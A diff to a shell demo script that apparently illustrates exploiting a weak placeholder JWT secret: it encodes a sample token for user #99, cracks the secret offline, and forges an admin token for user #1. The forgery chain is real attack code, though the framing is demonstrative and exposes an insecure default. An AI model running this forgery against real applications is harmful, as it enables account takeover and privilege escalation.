@@ -56,9 +56,14 @@ fi
 # Step 1: build a sample token. In a real engagement an attacker would obtain
 # this from the target — for the demo, we generate it locally with the actual
 # placeholder secret the AI shipped.
+#
+# Scenario: Alice is a normal user (user #99 — joined the app at some point
+# after the first 98 accounts). She captures her own token from the
+# Authorization header, cracks the secret offline, then forges a token
+# claiming to be user #1 (the original admin account, role=admin).
 SAMPLE_TOKEN=$("$VENV_PYTHON" -c "
 import jwt
-t = jwt.encode({'id': 1, 'role': 'user'}, '$SECRET', algorithm='HS256')
+t = jwt.encode({'id': 99, 'role': 'user'}, '$SECRET', algorithm='HS256')
 print(t.decode('utf-8') if isinstance(t, bytes) else t)
 ")
 
@@ -111,7 +116,7 @@ echo "  cracked in ${ELAPSED_MS}ms — secret: $CRACKED"
 echo
 
 # Step 3: forge an admin token with the cracked secret.
-FORGED=$("$VENV_PYTHON" "$SCRIPT_DIR/forge.py" "$CRACKED" --id 99 --role admin)
+FORGED=$("$VENV_PYTHON" "$SCRIPT_DIR/forge.py" "$CRACKED" --id 1 --role admin)
 echo "Forged admin token:"
 echo "  $FORGED"
 echo "  decoded claims (note id and role changed from the sample):"
